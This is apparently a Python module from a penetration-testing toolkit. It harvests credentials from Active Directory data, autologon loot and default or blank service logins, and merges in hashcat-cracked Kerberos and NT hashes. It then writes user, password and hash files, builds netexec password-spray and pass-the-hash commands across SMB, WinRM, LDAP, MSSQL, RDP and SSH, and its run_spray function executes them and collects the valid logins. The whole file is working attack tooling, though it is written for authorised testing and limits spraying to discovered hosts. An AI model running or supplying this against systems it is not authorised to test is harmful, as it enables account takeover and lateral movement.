"""Credential stacking + spray planning.

Stacks every credential recce has seen (auto-harvested from AD accounts with a
recovered secret, default/blank service logins, and autologon/stored creds in
ingested loot) together with any the tester captured by hand, deduped into one
set. From that set + the discovered remote-access surface it builds a spray plan:
the exact netexec / impacket commands to validate and reuse the credentials
across SMB / WinRM / LDAP / MSSQL / RDP / SSH, and writes users/passwords/hashes
files ready to feed those tools. Uses existing tools only; runs nothing itself.
"""
from __future__ import annotations

import os
import re

from ..core.models import Credential, Host


# --- auto-harvest from what recce already knows -------------------------------
_AUTOLOGON = re.compile(
    r"autologon password.*user\s*=\s*(?P<u>[^\s]+)\s+password\s*=\s*(?P<p>.+)", re.I)
_PG_DEFAULT = re.compile(r"postgresql login works:\s*(?P<u>\w+)\s*/\s*'?(?P<p>[^'\s]*)", re.I)
_BLANK_LOGIN = re.compile(
    r"(?:mysql|postgresql|mssql).*login.*user\s*=?\s*'?(?P<u>\w+)'?.*"
    r"(?:no password|blank|/ *'?<?blank)", re.I)


def _harvest_host(h: Host) -> list[Credential]:
    out: list[Credential] = []
    # 1) AD accounts carrying a recovered secret.
    for a in h.accounts:
        attrs = a.attrs or {}
        pw = attrs.get("password") or attrs.get("cleartext")
        nt = attrs.get("hash") or attrs.get("ntlm")
        if pw:
            out.append(Credential(username=a.name, secret=str(pw), kind="password",
                                  domain=a.domain, source=a.source or "ad",
                                  origin_ip=h.ip))
        elif nt:
            out.append(Credential(username=a.name, secret=str(nt), kind="nthash",
                                  domain=a.domain, source=a.source or "ad",
                                  origin_ip=h.ip))
    # 2) Default / blank service logins + autologon, from findings & loot text.
    texts = [f"{v.title} {v.output}" for v in h.vulns]
    texts += [f.get("vector", "") for f in getattr(h, "local_findings", []) or []]
    for t in texts:
        m = _AUTOLOGON.search(t)
        if m:
            out.append(Credential(username=m.group("u"), secret=m.group("p").strip(),
                                  kind="password", source="autologon", origin_ip=h.ip))
            continue
        m = _PG_DEFAULT.search(t)
        if m:
            out.append(Credential(username=m.group("u"), secret=m.group("p"),
                                  kind="password" if m.group("p") else "blank",
                                  source="default", origin_ip=h.ip,
                                  notes="default PostgreSQL login"))
            continue
        m = _BLANK_LOGIN.search(t)
        if m:
            out.append(Credential(username=m.group("u"), secret="", kind="blank",
                                  source="default", origin_ip=h.ip,
                                  notes="blank/no-password service login"))
    return out


def harvest(hosts: list[Host]) -> list[Credential]:
    out = []
    for h in hosts:
        out.extend(_harvest_host(h))
    return out


def stack(hosts: list[Host], stored: list[Credential] | None = None) -> list[Credential]:
    """Merge auto-harvested + manually-stored credentials, deduped by identity."""
    seen: set[str] = set()
    out: list[Credential] = []
    for c in (stored or []) + harvest(hosts):
        k = c.dedupe_key()
        if k in seen:
            continue
        seen.add(k)
        out.append(c)
    return out


# --- spray planning -----------------------------------------------------------
def spray_targets(hosts: list[Host]) -> dict[str, list[str]]:
    """The IPs that expose each sprayable protocol."""
    def ips(*ports):
        ps = set(ports)
        return sorted({h.ip for h in hosts if ps & {p.portid for p in h.open_ports}})
    return {"smb": ips(445, 139), "winrm": ips(5985, 5986), "ldap": ips(389, 3268),
            "mssql": ips(1433), "rdp": ips(3389), "ssh": ips(22)}


def _target_expr(ips: list[str]) -> str:
    """A target expression for netexec: exactly the enumerated in-scope IPs.

    Never widen to a whole /24. Spraying must only touch hosts recce actually
    discovered — collapsing to x.y.z.0/24 would fire auth attempts at up to 256
    addresses, including undiscovered/out-of-scope machines, and can lock out
    accounts recce never enumerated (defeating the lockout-safe guarantee)."""
    return " ".join(ips)


# --- crack -> spray: fold cracked plaintexts back in --------------------------
# recce formats hashes for hashcat in a dozen places (NT -m 1000, kerberoast
# -m 13100, AS-REP -m 18200, mssql -m 1731, mongodb -m 24100, ...) and then had
# no way to take the results back. That left the operator to re-key cracked
# passwords by hand, which on a real internal is where the next spray round
# comes from.

# A krb5tgs/krb5asrep hash embeds the account, so a cracked Kerberos hash names
# its own user without needing the store. Same expressions the AD parsers use.
_POT_TGS_USER = re.compile(r"^\$krb5tgs\$\d+\$\*([^$]+)\$([^$]+)\$")
_POT_ASREP_USER = re.compile(r"^\$krb5asrep\$(?:\d+\$)?([^@$\s]+)@(\S+?)[:$]")
_HEX32 = re.compile(r"^[0-9a-fA-F]{32}$")


def _known_hashes(creds: list[Credential], loot_dir: str = "") -> dict[str, tuple[str, str]]:
    """Map every hash recce holds -> (username, domain).

    Two sources, because recce stores them in two places: NT hashes live in the
    credential store, while roasted Kerberos hashes are written to loot/*.hash
    (cli/_service_helpers.py) and never became Credentials.
    """
    known: dict[str, tuple[str, str]] = {}
    for c in creds:
        if c.kind == "nthash" and c.secret:
            known[c.secret.strip().lower()] = (c.username, c.domain)
    if not loot_dir or not os.path.isdir(loot_dir):
        return known
    for fname in ("kerberoast.hash", "asrep.hash"):
        path = os.path.join(loot_dir, fname)
        if not os.path.exists(path):
            continue
        try:
            with open(path, encoding="utf-8", errors="replace") as fh:
                for line in fh:
                    line = line.strip()
                    if not line:
                        continue
                    m = _POT_TGS_USER.match(line) or _POT_ASREP_USER.match(line)
                    if m:
                        # TGS: (user, realm); AS-REP: (user, realm) - same order.
                        known[line] = (m.group(1), m.group(2))
        except OSError:
            continue
    return known


def parse_potfile(text: str, creds: list[Credential],
                  loot_dir: str = "") -> list[Credential]:
    """Turn `hash:plaintext` lines into password Credentials for the accounts they belong to.

    Matching is done by looking the hash up in what recce already captured rather
    than splitting the line, because a krb5tgs hash is full of colons and so is a
    NetNTLMv2 one - `rsplit(":", 1)` silently mangles both, and a password may
    legitimately contain a colon too. Anchoring on a known hash removes the
    ambiguity entirely; hashes recce never saw are skipped rather than guessed at.
    """
    known = _known_hashes(creds, loot_dir)
    if not known:
        return []
    # Longest-first so a hash that prefixes another can't win the wrong match.
    ordered = sorted(known, key=len, reverse=True)
    seen: set[tuple[str, str, str]] = set()
    out: list[Credential] = []
    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        hit = None
        for h in ordered:
            # hashcat lowercases hex digests in the potfile; Kerberos blobs keep case.
            if line.startswith(h + ":"):
                hit = h
            elif _HEX32.match(h) and line[:32].lower() == h and line[32:33] == ":":
                hit = h
            if hit:
                plain = line[len(hit) + 1:]
                break
        if not hit or not plain:
            continue
        user, domain = known[hit]
        if not user:
            continue
        key = (user.lower(), domain.lower(), plain)
        if key in seen:
            continue
        seen.add(key)
        out.append(Credential(
            username=user, secret=plain, kind="password", domain=domain,
            source="cracked",
            notes=f"cracked from {'kerberos' if hit.startswith('$krb5') else 'NT'} hash"))
    return out


def write_files(creds: list[Credential], out_dir: str,
                hosts: list[Host] | None = None) -> dict[str, str]:
    """Write users.txt / passwords.txt / nthashes.txt for the stacked set.

    When `hosts` is provided, ALSO merges in usernames recce learned from
    AD/BloodHound/SNMP/SMB SAMR/netexec user-enum (creds.known_users) — the
    spray tries every known account, not just those recce already has a
    credential for. Priority ordering is preserved (admins first, service
    accounts second) so a truncated tail is the ordinary-user tail rather
    than the interesting one.

    The default IS to include known users when `hosts` is available. That's
    what the operator running a spray expects — recce enumerated these
    accounts, the spray should try them. Lockout-safety (--no-bruteforce =
    one password per user per pass) is unchanged; the extra names just
    lengthen the pass rather than multiplying auth attempts.
    """
    os.makedirs(out_dir, exist_ok=True)
    users, passwords, hashes = [], [], []
    seen_users: set = set()

    def _add_user(name: str) -> None:
        if not name:
            return
        key = name.lower()
        if key in seen_users:
            return
        seen_users.add(key)
        users.append(name)

    # 1) Credentials first — these have a proven username (recce saw them
    # somewhere concrete: manual, secretsdump, gpp, autologon).
    for c in creds:
        _add_user(c.username)
        if c.kind == "password" and c.secret and c.secret not in passwords:
            passwords.append(c.secret)
        if c.kind == "nthash" and c.secret and c.secret not in hashes:
            hashes.append(c.secret)
    # 2) Then anything the enumeration paths surfaced but never captured a
    # secret for — BloodHound / LDAP / SNMP / SAMR. Priority-ordered so
    # admins land at the top of users.txt.
    if hosts:
        from .known_users import collect_user_accounts
        for a in collect_user_accounts(hosts):
            _add_user(a["name"])
    files = {}
    for name, rows in (("users.txt", users), ("passwords.txt", passwords),
                       ("nthashes.txt", hashes)):
        if rows:
            path = os.path.join(out_dir, name)
            # Explicit UTF-8: a captured username/password can be non-ASCII.
            with open(path, "w", encoding="utf-8") as fh:
                fh.write("\n".join(rows) + "\n")
            files[name] = path
    return files


def spray_commands(creds: list[Credential], hosts: list[Host],
                   files: dict[str, str]) -> list[str]:
    """netexec/impacket spray commands for the protocols present in scope."""
    targets = spray_targets(hosts)
    has_pw = any(c.kind == "password" and c.secret for c in creds)
    has_nt = any(c.kind == "nthash" and c.secret for c in creds)
    has_blank = any(c.kind == "blank" or not c.secret for c in creds)
    u = "users.txt"
    lines: list[str] = []
    for proto in ("smb", "winrm", "ldap", "mssql", "ssh"):
        ips = targets.get(proto) or []
        if not ips:
            continue
        tgt = _target_expr(ips)
        lines.append(f"# {proto.upper()}  ({len(ips)} host(s))")
        if has_pw:
            lines.append(f"netexec {proto} {tgt} -u {u} -p passwords.txt "
                         f"--continue-on-success --no-bruteforce")
        if has_nt and proto in ("smb", "winrm", "ldap", "mssql"):
            lines.append(f"netexec {proto} {tgt} -u {u} -H nthashes.txt "
                         f"--continue-on-success --no-bruteforce   # pass-the-hash")
        if has_blank and proto in ("smb", "mssql"):
            lines.append(f"netexec {proto} {tgt} -u {u} -p '' --continue-on-success")
    if targets.get("rdp"):
        lines.append(f"# RDP  ({len(targets['rdp'])} host(s)) - validate, then log in")
        lines.append(f"netexec rdp {_target_expr(targets['rdp'])} -u {u} "
                     f"-p passwords.txt --continue-on-success")
    return lines


def build_spray(creds: list[Credential], hosts: list[Host], out_dir: str) -> dict:
    """Write the credential files + assemble the spray plan. Returns a summary."""
    cred_dir = os.path.join(out_dir, "creds")
    # hosts= threads AD/BloodHound/SNMP/SAMR user enum into users.txt so the
    # spray tries every account recce enumerated, not just those with creds.
    files = write_files(creds, cred_dir, hosts=hosts)
    commands = spray_commands(creds, hosts, files)
    # Count how many usernames came from the enumeration paths vs credentials
    # so the CLI can print e.g. "45 usernames (3 with creds, 42 enum-only)".
    from .known_users import collect_user_accounts
    cred_users = {c.username.lower() for c in creds if c.username}
    enum_only = [a["name"] for a in collect_user_accounts(hosts)
                 if a["name"].lower() not in cred_users]
    return {"dir": cred_dir, "files": files, "commands": commands,
            "targets": spray_targets(hosts),
            "enum_only_users": enum_only,
            "enum_only_sources": sorted({s for a in collect_user_accounts(hosts)
                                         for s in a["sources"]})}


def _parse_nxc_hits(output: str) -> list[dict]:
    """Successful logins from ANY netexec/nxc run. Every protocol prints a hit as
    '<PROTO> <ip> <port> <host> [+] domain\\user:secret (Pwn3d!)' - key off the IP
    (first address-looking token) + the '[+] …:…' marker + the '(Pwn3d!)' admin flag."""
    import ipaddress
    hits: list[dict] = []
    for line in output.splitlines():
        if "[+]" not in line:
            continue
        ip = ""
        for tok in line.split()[1:4]:
            try:
                ipaddress.ip_address(tok)
                ip = tok
                break
            except ValueError:
                continue
        after = line.split("[+]", 1)[1].strip()
        admin = "Pwn3d" in after or "(admin)" in after.lower()
        cred = after.split("(")[0].strip()
        if ":" not in cred:
            continue
        user, secret = cred.split(":", 1)
        hits.append({"ip": ip, "user": user.strip(), "secret": secret.strip(),
                     "cred": cred, "admin": admin})
    return hits


def run_spray(hosts: list[Host], creds: list[Credential], out_dir: str, *,
              safe: bool = True, protocols=None, timeout: int = 1200) -> dict:
    """EXECUTE the spray with netexec and return the validated logins. Lockout-safe by
    default: --no-bruteforce pairs user<->pass line-by-line and does a single pass, so a
    domain lockout policy isn't tripped. safe=False drops --no-bruteforce = full
    user x password (real lockout risk - opt-in only). Needs nxc/netexec on PATH."""
    from . import credenum
    tool = credenum.smb_tool()
    if not tool:
        return {"ok": False, "error": "netexec/nxc not installed", "hits": [], "commands": []}
    files = write_files(creds, os.path.join(out_dir, "creds"), hosts=hosts)
    if not files.get("users.txt"):
        return {"ok": False, "error": "no usernames to spray", "hits": [], "commands": []}
    targets = spray_targets(hosts)
    protos = protocols or ["smb", "winrm", "mssql", "ldap", "ssh"]
    brute = [] if not safe else ["--no-bruteforce"]
    hits: list[dict] = []
    ran: list[str] = []
    for proto in protos:
        ips = targets.get(proto) or []
        if not ips:
            continue
        tgt = _target_expr(ips).split()
        runs = []
        if "passwords.txt" in files:
            runs.append([tool, proto, *tgt, "-u", files["users.txt"], "-p",
                         files["passwords.txt"], "--continue-on-success", *brute])
        if "nthashes.txt" in files and proto in ("smb", "winrm", "ldap", "mssql"):
            runs.append([tool, proto, *tgt, "-u", files["users.txt"], "-H",
                         files["nthashes.txt"], "--continue-on-success", *brute])
        for cmd in runs:
            out, _err = credenum._run(cmd, timeout=timeout)
            ran.append(" ".join(cmd))
            for h in _parse_nxc_hits(out or ""):
                h["proto"] = proto
                hits.append(h)
    seen: set = set()
    uniq = []
    for h in hits:
        k = (h["proto"], h["ip"], h["cred"])
        if k not in seen:
            seen.add(k)
            uniq.append(h)
    return {"ok": True, "hits": uniq, "commands": ran, "files": files, "safe": safe}
